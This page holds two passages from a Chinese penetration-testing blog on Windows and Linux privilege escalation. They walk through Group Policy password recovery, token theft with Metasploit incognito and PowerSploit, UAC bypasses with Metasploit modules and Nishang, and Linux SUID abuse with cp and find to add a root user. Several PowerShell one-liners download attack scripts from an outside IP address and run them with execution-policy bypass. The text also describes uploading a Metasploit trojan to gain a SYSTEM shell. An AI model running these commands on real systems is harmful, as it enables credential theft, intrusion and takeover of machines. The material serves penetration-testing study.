<p>PowerSploit中的Get-GPPPassword.ps1脚本可以获取组策略中的明文密码，这里不仅找到了包含cpassword获取组策略的凭据，并且将其中AES 256加密的明文密码还原了出来。</p>
<p>注意，我们只需要在域内任何一台以域用户权限登录的机器上均可查询到。</p>
<p>使用方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass IEX(New-ObjectNet.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/powersploit/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword</span><br></pre></td></tr></table></figure>

<h3 id="Metasploit下的利用"><a href="#Metasploit下的利用" class="headerlink" title="Metasploit下的利用"></a>Metasploit下的利用</h3><p>Metasploit下的相关模块为post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp，该模块可以获取组策略中的密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/credentials/gpp</span><br><span class="line">set session xxx</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h2 id="Windows令牌窃取"><a href="#Windows令牌窃取" class="headerlink" title="Windows令牌窃取"></a>Windows令牌窃取</h2><p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许某次请求和判断某次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌除非系统重新启动，否则将持续存在于系统中。令牌最大的特点就是随机性，不可预测，一般的黑客攻击者或软件无法猜测出令牌。</p>
<p>令牌(Token)有很多种：</p>
<blockquote>
<p>访问令牌(Access Token)：表示访问控制操作主体的系统对象</p>
<p>会话令牌(Session Token)：是交互会话中唯一的身份标识符</p>
<p>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾</p>
</blockquote>
<p>伪造令牌攻击的核心是Kerberos协议。Kerberos认证过程详情请见大佬文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/13758c310242%EF%BC%8C%E8%BF%99%E9%87%8C%E5%86%99%E7%9A%84%E5%8D%81%E5%88%86%E8%AF%A6%E7%BB%86%E4%BA%86%E3%80%82">https://www.jianshu.com/p/13758c310242，这里写的十分详细了。</a></p>
<p>假冒令牌可以假冒一个网络中的另一个用户进行各类类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</p>
<h3 id="Metasploit下的令牌窃取"><a href="#Metasploit下的令牌窃取" class="headerlink" title="Metasploit下的令牌窃取"></a>Metasploit下的令牌窃取</h3><p>需要我们已经获取了目标主机一个administrator权限的meterpreter，需要提前至system，我们可以用metasploit的incognito模块窃取令牌</p>
<p>如下，输入 <code>use incognito</code> 来先加载incognito模块，然后输入<code>list_tokens -u</code> 命令即可列出可用的访问令牌：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021728708.png" alt="image-20231002172837563"></p>
<p>可以看到，这里的Windows访问令牌有两种类型：</p>
<blockquote>
<p><strong>Delegation Token</strong>：授权令牌，它支持交互式会话登录(例如本地用户直接登录、远程桌面登录访问)</p>
<p><strong>Impresonation Token</strong>：模拟令牌，它是非交互的会话(例如使用net use访问共享文件夹)。</p>
</blockquote>
<p><strong>注：</strong>两种token只在系统重启后清除 具有 Delegation token 的用户在注销后，该Token将变成Impersonation token ，依旧有效。</p>
<p>这里，我们可以看到列出了三个授权令牌，我们执行如下命令，就可以伪造NT AUTHORITY\SYSTEM令牌，来模拟SYSTEM用户了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021729757.png" alt="image-20231002172919654"></p>
<p>注意： <code>list_tokens -u</code> 命令列出的令牌取决于你获得的meterpreter的访问级别，这里我们测试的是管理员权限到system权限，如果我们获取的用户不是管理员而是普通用户权限，也有可能列出相应的高权限令牌。</p>
<p>此外，我们还可以利用 steal_token <pid> 命令从相应的进程中窃取令牌。先执行 ps 找到User为SYSTEM或管理员的进程，并记下其进程的PID，然后执行 steal_token <pid> ：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021729060.png" alt="image-20231002172934952"></p>
<p>Metasploit incognito模块的相关命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getuid # 查看当前令牌(token)</span><br><span class="line">use incognito # 加载incognito模块</span><br><span class="line">list_tokens -u # 列出访问令牌</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; #模拟system用户，getsystem命令即实现了该命令。如果要模拟其他用户，将token名改为其他用户即可</span><br><span class="line">steal_token 1252 # 从进程窃取token</span><br><span class="line">getsystem # 提升至system权限</span><br><span class="line">rev2self # 返回到之前的AccessToken权限</span><br></pre></td></tr></table></figure>

<h3 id="incognito-exe工具下的令牌窃取"><a href="#incognito-exe工具下的令牌窃取" class="headerlink" title="incognito.exe工具下的令牌窃取"></a>incognito.exe工具下的令牌窃取</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
<p>incognito.exe工具也可以用来进行令牌窃取。</p>
<p>首先在目标主机上上传incognito.exe：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021729647.png" alt="image-20231002172947524"></p>
<p>然后进入shell，执行如下命令列举存在的访问令牌：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens -u</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021730099.png" alt="image-20231002173001855"></p>
<p>然后我们就可以通过执行如下命令窃取令牌来模拟其他用户：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute -c &quot;完整的Token名称&quot; &lt;要执行的命令&gt;</span><br><span class="line">例如执行whoami命令：</span><br><span class="line">incognito.exe execute -c &quot;完整的Token名称&quot; whoami</span><br><span class="line"></span><br><span class="line">例如：模拟SYSTEM权限用户：</span><br><span class="line">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br><span class="line">降权至当前用户：</span><br><span class="line">incognito.exe execute -c &quot;当前用户token&quot; cmd.exe</span><br></pre></td></tr></table></figure>

<p>但是这里由于我们是在meterpreter的shell中执行的系统命令，其没有回显(时间好长啊)，我们可以直接上传一个msf马和incognito.exe，然后利用窃取的令牌所获得的system权限来执行我们所上传的msf马，从而从新获得一个system权限的meterpreter，如下图，成功获得了一个system权限的meterpreter：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021730178.png" alt="image-20231002173034113"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021731409.png" alt="image-20231002173112204"></p>
<h3 id="Rotten-Potato工具下的令牌窃取"><a href="#Rotten-Potato工具下的令牌窃取" class="headerlink" title="Rotten Potato工具下的令牌窃取"></a>Rotten Potato工具下的令牌窃取</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></p>
<p>见上面的烂土豆</p>
<h3 id="PowerShell下的令牌窃取"><a href="#PowerShell下的令牌窃取" class="headerlink" title="PowerShell下的令牌窃取"></a>PowerShell下的令牌窃取</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p>
<p>Invoke-TokenManipulation.ps1脚本是PowerSploit中Exfiltration文件夹内的一个脚本。</p>
<p>首先执行如下命令列举token:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/powersploit/Exfiltration/Invoke-TokenManipulation.ps1&#x27;);Invoke-TokenManipulation -Enumerate</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021731905.png" alt="image-20231002173132830"></p>
<p>如上图，成功列举出了token。然后执行如下命令窃取system的token：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021731315.png" alt="image-20231002173149261"></p>
<p>如上图，执行命令后，成功弹出了一个system权限的shell。</p>
<p>不仅如此，我们还可以从进程中窃取令牌token，首先查看高权限的进程：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021732749.png" alt="image-20231002173200695"></p>
<p>然后执行如下命令从进程中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ProcessId 2504</span><br></pre></td></tr></table></figure>

<p>如下图，成功：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021732832.png" alt="image-20231002173210778"></p>
<h3 id="利用令牌获得TrustedInstaller权限"><a href="#利用令牌获得TrustedInstaller权限" class="headerlink" title="利用令牌获得TrustedInstaller权限"></a>利用令牌获得TrustedInstaller权限</h3><p>有时候，在Windows系统中即使获得了管理员权限和SYSTEM权限，也不能修改系统文件，因为Windows系统的最高权限为 TrustedInstaller 权限。</p>
<p>例如 <code>C:\Windows\servicing</code>路径，即使使用SYSTEM权限也无法在该路径进行读写文件：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021732501.png" alt="image-20231002173221452"></p>
<p>当我们启动TrustedInstaller服务时会启动进程TrustedInstaller.exe，位置位于<code>C:\Windows\servicing\TrustedInstaller.exe</code> ，我们可以用 Get-Acl 查看该程序的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe</span><br><span class="line">Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Powershell中有一个Get-Acl命令，这个命令是用来获取资源安全描述的命令，可以用来查看文件的权限。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021732645.png" alt="image-20231002173233597"></p>
<p>我们可以看到该程序的权限(所属用户)为NT SERVICE\TrustedInstaller。</p>
<p>那我们的思路就是，借用TrustedInstaller.exe的token令牌创建子进程，这样子进程就有了TrustedInstaller权限。</p>
<p>思路如下：</p>
<blockquote>
<p>启动服务TrustedInstaller</p>
<p>使用incognito获取TrustedInstaller.exe的token</p>
<p>获得TrustedInstaller权限</p>
</blockquote>
<p><strong>（1）在metasploit的incognito模块下测试（已获得一个管理员权限的meterpreter）</strong></p>
<p>首先进入shell启动TrustedInstaller服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe start TrustedInstaller # 先进入shell启动TrustedInstaller服务</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021732443.png" alt="image-20231002173246268"></p>
<p>然后执行如下即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">ps # 找到TrustedInstaller的进程PID，这里为2180</span><br><span class="line">steal_token &lt;PID&gt; # 从该进程中窃取令牌</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>

<p>可以看到在窃取TrustedInstaller的令牌前，对C:\Windows\servicing目录没有写权限：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021733431.png" alt="image-20231002173302258"></p>
<p>而窃取TrustedInstaller的令牌后，对C:\Windows\servicing目录就有了写权限：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021733052.png" alt="image-20231002173314903"></p>
<p><strong>（2）在PowerShell下使用Invoke-TokenManipulation.ps1脚本测试</strong></p>
<p>代码执行如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc.exe start TrustedInstaller # 启动TrustedInstaller服务</span><br><span class="line"></span><br><span class="line">$id = Get-Process -name TrustedInstaller* | Select-Object id | ForEach-Object -Process&#123;$_.id&#125;</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.101.219.210/powersploit/Exfiltration/Invoke-TokenManipulation.ps1&#x27;);Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ProcessId $id</span><br></pre></td></tr></table></figure>

<p>窃取TrustedInstaller的令牌后，对C:\Windows\servicing目录就有了写权限：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021733183.png" alt="image-20231002173329094"></p>
<p>这里，在成功窃取TrustedInstaller的令牌后会发现自己的权限仍是NT AUTHORITY\SYSTEM，这是因为TrustedInstaller权限也会显示为NT AUTHORITY\SYSTEM，执行下面这个命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups | findstr TrustedInstaller</span><br></pre></td></tr></table></figure>

<p>如果有回显，代表当前是TrustedInstaller权限：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021734216.png" alt="image-20231002173409153"></p>
<h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><p>UAC，即用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p>
<p>使用 UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员级别的访问权限时除外。UAC 会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。</p>
<p><strong>UAC如何运行？</strong></p>
<p>UAC通过阻止程序执行任何涉及有关系统更改&#x2F;特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。</p>
<h3 id="Metasploit下的绕过UAC提权"><a href="#Metasploit下的绕过UAC提权" class="headerlink" title="Metasploit下的绕过UAC提权"></a>Metasploit下的绕过UAC提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/ask # 弹出UAC确认窗口，然后诱使用户点击后获得system权限</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac # 此模块将通过进程注入使用可信任发布者证书绕过Windows UAC。它将生成关闭UAC的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_injection # 此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_fodhelper # 此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10的UAC。它将生成关闭UAC标志的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_eventvwr # 此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac_comhijack # 此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。</span><br></pre></td></tr></table></figure>

<p>以上模块都是从meterpreter中设置好session执行完后，绕过UAC，获得一个关闭了UAC的第二个shell，再在这个关闭了UAC的第二个shell中执行 getsystem 即可完成提权。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021734294.png" alt="image-20231002173430063"></p>
<h3 id="PowerShell下的绕过UAC提权"><a href="#PowerShell下的绕过UAC提权" class="headerlink" title="PowerShell下的绕过UAC提权"></a>PowerShell下的绕过UAC提权</h3><p>即利用Nishang中Escalation目录下的Invoke-PsUACme.ps1脚本。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<p>执行如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/nishang/Escalation/Invoke-PsUACme.ps1&#x27;);Invoke-PsUACme -Verbose # 使用sysprep方法并执行默认的payload</span><br><span class="line"></span><br><span class="line">Invoke-PsUACme -method oobe -verbose # 使用oobe方法并执行默认的payload</span><br></pre></td></tr></table></figure>

<p>如下图，执行完后会弹出一个具有管理员权限的shell：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021734707.png" alt="image-20231002173448640"></p>
<p>还可以使用 -Payload 参数自行指定要执行的Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PsUACme -method oobe -verbose -Payload &quot;powershell -windowstyle hidden -e YourBase64EncodedPayload&quot;</span><br></pre></td></tr></table></figure>

<p>即可在绕过UAC后以高权限执行后面的powershell代码。</p>
<p>还可以使用 -PayloadPath 参数自行指定要执行的Payload的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PsUACme -method oobe -verbose -PayloadPath &lt;路径&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以利用这个来在绕过UAC后以高权限执行后面的msf马，以获得管理员权限的meterpreter。</p>
<p>除了以上那些绕过UAC的方法外，我们还可以利用CVE-2019-1388等漏洞来绕过，该漏洞位于Windows的UAC机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——SecureDesktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。因为用户可以与该UI交互，因此对UI来说紧限制是必须的。否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作。即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC会话中含有尽可能少的点击操作选项。利用该漏洞很容易就可以提升权限到SYSTEM。</p>
<blockquote>
<p>详情请见：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sun1318578251/article/details/103325724">https://blog.csdn.net/sun1318578251/article/details/103325724</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mQqCuH6xOvYJC8-C0aRe4w">https://mp.weixin.qq.com/s/mQqCuH6xOvYJC8-C0aRe4w</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://cjb12.github.io/project/2023/04/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Windows%E7%AF%87%EF%BC%89/" data-id="cln8p3qxg0004d4tgcl5jf262" data-title="内网渗透之权限提升（Windows篇）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-内网渗透之权限提升（Linux篇）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Linux%E7%AF%87%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-04-12T02:46:56.000Z" itemprop="datePublished">2023-04-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Linux%E7%AF%87%EF%BC%89/">内网渗透之权限提升（Linux篇）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>Linux系统权限</strong></p>
<p><strong>文件基本权限</strong></p>
<p><strong>授权信息查看</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l file ###文件</span><br><span class="line">ls -ld westos ###目录</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021641162.png" alt="image-20231002164131090"></p>
<p>文件列表信息分为：文件类型、权限、链接数、所属用户、所属用户组、文件大小、最后修改时间、文件名。</p>
<p>linux一共有7种文件类型,分别如下:</p>
<p>- ：普通文件</p>
<p>d ：目录文件</p>
<p>l ： 软链接（类似Windows的快捷方式）</p>
<p>(<strong>下面四种是特殊文件</strong><strong>)</strong></p>
<p>b：块设备文件（例如硬盘、光驱等）</p>
<p>p：管道文件</p>
<p>c：字符设备文件（例如猫等串口设备）</p>
<p>s：套接口文件&#x2F;数据接口文件（例如启动一个MySql服务器时会产生一个mysql.sock文件）</p>
<p><strong>文件权限对应关系</strong></p>
<p>ls -l file ###文件</p>
<p>ls -ld westos ###目录</p>
<p><strong>文件权限对应关系</strong></p>
<table>
<thead>
<tr>
<th><strong>权限</strong></th>
<th><strong>对应数字</strong></th>
<th><strong>意义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>4</td>
<td>可读</td>
</tr>
<tr>
<td>w</td>
<td>2</td>
<td>可写</td>
</tr>
<tr>
<td>x</td>
<td>1</td>
<td>可执行</td>
</tr>
</tbody></table>
<p>对于文件：</p>
<p>r ： 可以读取文件内容(比如命令 cat more head tail)</p>
<p>w ： 可以编辑文件(比如命令 vim echo )，但是不能删除文件，因为文件名没有放在自己的文件空间，而是放在了上一级的目录空间 下</p>
<p>x ： 可以执行</p>
<p>对于目录：</p>
<p>r：可以查询目录下的文件（比如命令ls ll）</p>
<p>w：具有修改目录结构的权限，比如新建文件和目录，删除此目录下文件和目录，重命名此目录下文件和目录，剪切和复制（比如命令 cp mv touch rm）</p>
<p>x：目录有执行权限但是不能运行，可以进入目录（cd命令）</p>
<p>对文件来说最高权限是x，对于目录来说最高权限是w，一般给目录赋予权限0 ，5（rx），7（rxw），赋予4 ，1， 6都是没有意义的。对于文件能否删除，首先要对目录具有执行权限，同时对文件也具有执行权限。</p>
<p>rwxr-xr-x 2 root root 4096 8月 22 16:15 backups</p>
<p><strong>rwx</strong>：代表文件所有者(u表示)权限，这里是root，root对该文件拥有读写执行权限。</p>
<p><strong>r-x :</strong> 代表所属组(g表示)的权限，这里所属组拥有对该文件读和执行的权限。</p>
<p><strong>r-x :</strong> 代表其他人(o表示)的权限，这里和上面权限一样。</p>
<p><strong>修改文件的权限</strong></p>
<p>语法: chmod （选项） 模式 文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x a.txt</span><br></pre></td></tr></table></figure>

<p>加上执行权限(x),u就是代表文件拥有者。</p>
<p>如果想给a.txt的用户组和其他用户也加上执行权限,可以加上多个。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod g+x,o+x a.txt</span><br></pre></td></tr></table></figure>



<p>既然可以加权限，也可以减权限,加号改成减号就行。 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod g-x,o-x a.txt</span><br></pre></td></tr></table></figure>

<p>还有更简单的方式，直接用等于号赋予相应的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u=rwx,g=rwx,o=rwx a.txt</span><br></pre></td></tr></table></figure>

<p>或者用a&#x3D;的方式赋予，a就是代表all。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a=rwx a.txt</span><br></pre></td></tr></table></figure>

<p>也可以给多个文件赋予权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a=rwx a.txt b.txt</span><br></pre></td></tr></table></figure>

<p><strong>chown命令</strong>：用来改变文件或目录的所有者和所属用户组。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown test123:test123 abc #将abc用户组和所属者都改成test123</span><br></pre></td></tr></table></figure>

<p><strong>Linux****常用权限</strong></p>
<p>\1. 600（rw——）：只有root有读写权限。</p>
<p>\2. 644（rw-r–r–）：只有root有读写权限；group用户和other用户只有读权限。</p>
<p>\3. 755（rwxr-xr-x）：root有读、写、执行权限；group用户和other用户只有读、执行权限。</p>
<h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a><strong>Linux提权</strong></h2><h2 id="非漏洞提权"><a href="#非漏洞提权" class="headerlink" title="非漏洞提权"></a><strong>非漏洞提权</strong></h2><h2 id="利用SUID进行提权"><a href="#利用SUID进行提权" class="headerlink" title="利用SUID进行提权"></a><strong>利用SUID进行提权</strong></h2><p><strong>SUID权限</strong></p>
<p>1，SUID权限只能设置二进制文件。</p>
<p>2，命令执行者要有二进制文件的执行权。</p>
<p>3，命令执行者执行二进制文件时会获得该程序的属主身份。</p>
<p>4，SUID权限只在程序执行过程中有效。</p>
<p>即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限。</p>
<p><strong>cp</strong></p>
<p>以cp为例，这里给cp添加SUID权限做测试，拥有SUID权限的程序会有rwx变成rws。（rws中的s就是SUID权限）</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021641867.png" alt="image-20231002164155790"></p>
<p>可以通过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>命令来查找拥有SUID权限的程序。</p>
<p>perm指定权限，-u&#x3D;s代表SUID权限，type指定文件类型，f表示常规文件。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021642168.png" alt="image-20231002164235117"></p>
<p>当普通用户运行cp命令时，此时的cp权限就为root，利用时，可以cp把&#x2F;etc&#x2F;passwd复制到桌面，然后进行修改。</p>
<p>首先用openssl生成一个密码。passwd参数代表生成一个密码，-1为md5，-salt指定盐（随意指定），最后跟要加密的值，也就是密码123456</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021642627.png" alt="image-20231002164244581"></p>
<p>在桌面创建一个passwd文件，将&#x2F;etc&#x2F;passwd中的内容复制进去</p>
<p>然后按照&#x2F;etc&#x2F;passwd的格式添加一个新用户，权限按root的写即可。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643589.png" alt="image-20231002164325542"></p>
<p>添加后我们用cp再把文件复制回去进行替换，此时就添加了一个abcd用户，权限为root。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643707.png" alt="image-20231002164336647"></p>
<p>提权成功</p>
<p><strong>find</strong></p>
<p>find命令在拥有SUID权限的情况下，也可以用来进行提权。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643009.png" alt="image-20231002164347937"></p>
<p>只需要使用exec参数即可。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644588.png" alt="image-20231002164401533"></p>
<p>find的exec参数用来指定其它命令，以便于来处理搜到的结果。结果的输出，需要以分号来结束，在bash环境中分号代表代码块结束，有特殊意义，所以这里需要进行转义。</p>
<p><strong>vim</strong></p>
<p>vim在拥有SUID权限的情况下，也可以用来进行提权</p>
